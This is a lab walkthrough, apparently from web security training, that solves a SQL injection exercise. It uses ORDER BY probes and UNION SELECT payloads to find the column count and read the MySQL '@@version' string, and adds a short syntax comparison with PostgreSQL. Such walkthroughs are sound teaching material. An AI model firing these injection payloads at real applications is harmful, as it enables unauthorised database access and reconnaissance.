# Lab 06: SQL injection attack, querying the database type and version on MySQL and Microsoft

**Goal**: Display the database version string to solve the lab.

This lab contains a SQL injection vulnerability in the product category filter. You can use a `UNION` attack to retrieve the results from an injected query.

---

## 🎯 Solution

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns returned by the query and which columns contain text data.
3. Inject the payload to retrieve the database version string:
   ```sql
   '+UNION+SELECT+@@version,+NULL--+
   ```
4. Verify that the response displays the database version string (e.g., `8.0.42-0ubuntu0.20.04.1`).

![Lab 6 Solution Summary](Pasted%20image%2020260828194205.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Find Column Count
Test using `ORDER BY`:
```http
/filter?category=Gifts'+ORDER+BY+1--+
/filter?category=Gifts'+ORDER+BY+2--+
/filter?category=Gifts'+ORDER+BY+3--+
```

> [!NOTE]
> In MySQL, comment `--` must be followed by a space (encoded as `+` in URL parameters, e.g. `--+`). Receiving an internal server error on `ORDER BY 3` confirms that the query returns **2 columns**.

### Step 2: Confirm Text Columns
Test columns with string/text values:
```http
/filter?category=Gifts'+UNION+SELECT+'a','a'--+
```

### Step 3: Extract Database Version
Inject `@@version` to retrieve the database version:
```http
/filter?category=Gifts'+UNION+SELECT+@@version,NULL--+
```
*(Or if column 2 is text: `/filter?category=Gifts'+UNION+SELECT+NULL,@@version--+`)*

The application response displays:
```text
8.0.42-0ubuntu0.20.04.1
```

> [!SUCCESS]
> **Lab Solved**: Successfully retrieved the database version string!

---

## 💡 Key Takeaways: MySQL vs PostgreSQL Syntax

| Feature | PostgreSQL | MySQL / Microsoft SQL Server |
|---|---|---|
| **Comments** | `--` | `-- ` (requires trailing space, `--+` in URL) or `#` |
| **Version Variable/Function** | `version()` | `@@version` |
| **String Concatenation** | `||` | `CONCAT()` |

> [!NOTE]
> **Why `@@version` instead of `version()`?**
> - In PostgreSQL, `version()` is a built-in function that returns the full version string.
> - In MySQL and Microsoft SQL Server, `@@version` is a system variable containing the database software version.
